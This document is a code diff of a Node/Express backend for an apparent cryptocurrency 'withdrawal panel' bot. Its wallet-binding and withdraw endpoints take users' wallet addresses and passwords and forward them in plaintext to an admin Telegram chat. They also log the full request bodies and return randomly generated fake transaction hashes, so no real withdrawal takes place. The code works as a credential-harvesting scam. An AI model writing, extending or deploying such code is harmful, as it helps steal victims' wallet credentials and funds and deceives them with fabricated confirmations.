@@ -1,131 +1,114 @@
 import express from "express";
-import bodyParser from "body-parser";
 import cors from "cors";
-import { Telegraf } from "telegraf";
-import crypto from "crypto";
+import bodyParser from "body-parser";
+import fetch from "node-fetch";
 
 const app = express();
 app.use(cors());
 app.use(bodyParser.json());
 
-// =========================
-// ENV
-// =========================
+// ===== ENV VARIABLES =====
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
-const WEBHOOK_URL = process.env.WEBHOOK_URL;
+const PORT = process.env.PORT || 3000;
 
-if (!BOT_TOKEN || !ADMIN_CHAT_ID || !WEBHOOK_URL)
-  console.log("❌ Missing environment variables");
+// Debugging ENV
+console.log("BOT_TOKEN:", !!BOT_TOKEN);
+console.log("ADMIN_CHAT_ID:", ADMIN_CHAT_ID);
+console.log("PORT:", PORT);
 
-const bot = new Telegraf(BOT_TOKEN);
-
-// =========================
-// In-Memory Data (can replace with DB later)
-// =========================
-let userData = {
-  wallet: null,
-  password: null,
-};
-
-// =========================
-// Telegram Webhook
-// =========================
-bot.telegram.setWebhook(`${WEBHOOK_URL}/webhook`);
-app.use(bot.webhookCallback("/webhook"));
-
-// Basic Commands
-bot.start((ctx) => ctx.reply("Welcome! Withdrawal panel is ready."));
-bot.help((ctx) => ctx.reply("Send /withdraw to open withdrawal panel."));
-bot.command("withdraw", (ctx) => {
-  ctx.reply("Click below to open withdrawal panel:", {
-    reply_markup: {
-      inline_keyboard: [
-        [{ text: "Open Withdrawal Page", web_app: { url: WEBHOOK_URL } }],
-      ],
-    },
-  });
+// ====== TEST ROOT ======
+app.get("/", (req, res) => {
+  res.send("Crypto Withdrawal Bot API running");
 });
 
-// =========================
-// API — Get Wallet Status
-// =========================
-app.get("/api/wallet", (req, res) => {
-  res.json({
-    wallet: userData.wallet,
-  });
-});
+// ========================================================
+//  🚀 WALLET BINDING API
+// ========================================================
+app.post("/api/wallet", async (req, res) => {
+  try {
+    const { wallet, password, coin = "N/A" } = req.body;
 
-// =========================
-// API — Bind / Update Wallet
-// =========================
-app.post("/api/wallet", (req, res) => {
-  const { wallet, oldWallet } = req.body;
+    if (!wallet || !password) {
+      return res.status(400).json({ error: "Missing wallet or password" });
+    }
 
-  if (!wallet) return res.json({ success: false, error: "Wallet required" });
+    console.log("Wallet bind request:", req.body);
 
-  // Bind once — unless modifying
-  if (!oldWallet && userData.wallet)
-    return res.json({
-      success: false,
-      error: "Wallet already bound",
+    const message = 
+`🔐 NEW WALLET BINDING
+--------------------------------
+🏦 Wallet: ${wallet}
+🔑 Password: ${password}
+💰 Coin: ${coin}
+
+⚠️ Wallet & password can be bound once.`;
+
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: ADMIN_CHAT_ID,
+        text: message
+      })
     });
 
-  userData.wallet = wallet;
+    return res.json({ ok: true, message: "Wallet binding sent to admin." });
 
-  res.json({
-    success: true,
-    wallet: userData.wallet,
-  });
+  } catch (err) {
+    console.error("Wallet API ERROR:", err);
+    return res.status(500).json({ error: "Backend Error" });
+  }
 });
 
-// =========================
-// API — Submit Withdrawal
-// =========================
+// ========================================================
+//  🚀 WITHDRAW REQUEST API
+// ========================================================
 app.post("/api/withdraw", async (req, res) => {
-  const { coin, amount, wallet } = req.body;
+  try {
+    const { coin, amount, usdt, wallet, password } = req.body;
 
-  if (!wallet) return res.json({ success: false, error: "Wallet required" });
-  if (!amount || amount <= 0)
-    return res.json({ success: false, error: "Invalid amount" });
+    if (!coin || !amount || !usdt || !wallet || !password) {
+      return res.status(400).json({ error: "Missing fields" });
+    }
 
-  const usdtValue = (amount * 50 - 0.1).toFixed(4);
-  const password = userData.password || "44721";
-  userData.password = password;
+    // Generate transaction hash
+    const hash = "#TX" + Math.floor(Math.random() * 999999999);
 
-  const txHash =
-    "TX-" + crypto.randomBytes(6).toString("hex") + "-" + Date.now().toString().slice(-6);
+    console.log("Withdraw request:", req.body);
 
-  // Telegram Notify
-  const msg = `
-📤 NEW WITHDRAWAL REQUEST
+    const message =
+`📤 NEW WITHDRAWAL REQUEST
 --------------------------------
 💰 Coin: ${coin}
 🔢 Amount: ${amount}
-💵 USDT: ${usdtValue}
+💵 USDT: ${usdt}
 🏦 Wallet: ${wallet}
 🔐 Password: ${password}
-🆔 Transaction Hash: ${txHash}
-
+🆔 Transaction Hash: ${hash}
 ⚠️ Wallet & password can be bound once.
-Please screenshot the transaction hash for record.
-`;
+Please screenshot the transaction hash for record.`;
 
-  await bot.telegram.sendMessage(ADMIN_CHAT_ID, msg);
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: ADMIN_CHAT_ID,
+        text: message
+      })
+    });
 
-  res.json({
-    success: true,
-    hash: txHash,
-  });
+    return res.json({ ok: true, hash });
+
+  } catch (err) {
+    console.error("Withdraw API ERROR:", err);
+    return res.status(500).json({ error: "Backend Error" });
+  }
 });
 
-// =========================
-// Server Start
-// =========================
-app.get("/", (req, res) => {
-  res.sendFile("/app/public/index.html");
-});
-
-app.listen(3000, () => {
-  console.log("🚀 Server running on port 3000");
+// ========================================================
+//  🚀 START SERVER
+// ========================================================
+app.listen(PORT, () => {
+  console.log(`🚀 Server running on port ${PORT}`);
 });
